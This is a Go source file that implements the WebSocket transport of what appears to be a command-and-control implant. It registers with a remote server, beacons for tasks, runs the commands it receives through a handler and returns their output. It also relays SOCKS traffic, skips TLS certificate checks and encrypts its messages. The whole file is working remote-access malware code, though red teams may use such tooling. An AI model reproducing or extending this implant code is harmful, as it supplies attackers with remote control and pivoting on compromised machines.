//go:build transport_ws

// transport_ws.go — WebSocket transport (requires gorilla/websocket)
package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ActiveTransport struct {
	url       string
	userAgent string
	conn      *websocket.Conn
	mu        sync.Mutex
	encryptFn func(string) string
	decryptFn func(string) string
}

func NewActiveTransport(scheme, host, port, ua, _, _, _ string,
	encFn func(string) string, decFn func(string) string) *ActiveTransport {
	wsScheme := "ws"
	if scheme == "https" || scheme == "wss" {
		wsScheme = "wss"
	}
	return &ActiveTransport{
		url:       fmt.Sprintf("%s://%s:%s", wsScheme, host, port),
		userAgent: ua,
		encryptFn: encFn,
		decryptFn: decFn,
	}
}

func (t *ActiveTransport) connect() error {
	dialer := websocket.Dialer{
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
		HandshakeTimeout: 30 * time.Second,
	}
	header := http.Header{}
	header.Set("User-Agent", t.userAgent)
	conn, _, err := dialer.Dial(t.url, header)
	if err != nil {
		return err
	}
	t.conn = conn
	return nil
}

func (t *ActiveTransport) send(msg map[string]interface{}) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	data, _ := json.Marshal(msg)
	return t.conn.WriteMessage(websocket.TextMessage, []byte(t.encryptFn(string(data))))
}

func (t *ActiveTransport) recv() (map[string]interface{}, error) {
	_, message, err := t.conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	dec := t.decryptFn(string(message))
	var result map[string]interface{}
	err = json.Unmarshal([]byte(dec), &result)
	return result, err
}

func (t *ActiveTransport) Register(metadata map[string]interface{}) (string, error) {
	if err := t.connect(); err != nil {
		return "", err
	}
	if err := t.send(map[string]interface{}{"type": "register", "metadata": metadata}); err != nil {
		return "", err
	}
	resp, err := t.recv()
	if err != nil {
		return "", err
	}
	if tp, _ := resp["type"].(string); tp == "registered" || tp == "checkin_ack" {
		if id, ok := resp["agent_id"].(string); ok {
			return id, nil
		}
	}
	return "", fmt.Errorf("registration failed")
}

func (t *ActiveTransport) Checkin(agentID string, results []map[string]interface{}) ([]map[string]interface{}, error) {
	if t.conn == nil {
		if err := t.connect(); err != nil {
			return nil, err
		}
	}
	if results == nil {
		results = []map[string]interface{}{}
	}
	msg := map[string]interface{}{
		"type": "checkin", "agent_id": agentID,
		"metadata": map[string]string{"mode": "beacon"},
		"results":  results,
	}
	if err := t.send(msg); err != nil {
		t.conn = nil
		return nil, err
	}
	resp, err := t.recv()
	if err != nil {
		t.conn = nil
		return nil, err
	}
	var commands []map[string]interface{}
	if tp, _ := resp["type"].(string); tp == "checkin_ack" || tp == "registered" {
		t.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		for {
			cmd, err := t.recv()
			if err != nil {
				break
			}
			if ct, _ := cmd["type"].(string); ct == "command" {
				commands = append(commands, cmd)
			}
		}
		t.conn.SetReadDeadline(time.Time{})
	}
	return commands, nil
}

func (t *ActiveTransport) SendResult(agentID, command, output string) error {
	return t.send(map[string]interface{}{
		"type": "response", "output": output,
		"command": command, "timestamp": time.Now().Format(time.RFC3339),
	})
}

func (t *ActiveTransport) StartStreaming(agentID string, handler func(string) string) error {
	if t.conn == nil {
		if err := t.connect(); err != nil {
			return err
		}
		t.send(map[string]interface{}{
			"type": "checkin", "agent_id": agentID,
			"metadata": map[string]string{"mode": "streaming"},
		})
		t.recv()
	}
	// Heartbeat
	go func() {
		for {
			time.Sleep(10 * time.Second)
			t.send(map[string]interface{}{"type": "heartbeat"})
		}
	}()

	// SOCKS relay state
	var socksRelay *SocksRelay
	sendFn := func(msg map[string]interface{}) error { return t.send(msg) }

	// Command loop
	for {
		cmd, err := t.recv()
		if err != nil {
			return err
		}
		ct, _ := cmd["type"].(string)
		switch ct {
		case "command":
			command, _ := cmd["command"].(string)
			if command == "__kill" {
				return nil
			}
			t.SendResult(agentID, command, handler(command))
		case "kill":
			return nil
		case "socks_init", "socks_connect", "socks_send", "socks_data":
			socksRelay = HandleSocksMessage(cmd, socksRelay, sendFn)
		case "heartbeat_ack", "set_interval":
			// handled elsewhere
		case "downgrade_mode":
			if socksRelay != nil {
				socksRelay.Close()
			}
			return nil
		}
	}
}

func (t *ActiveTransport) Close() {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
	}
}
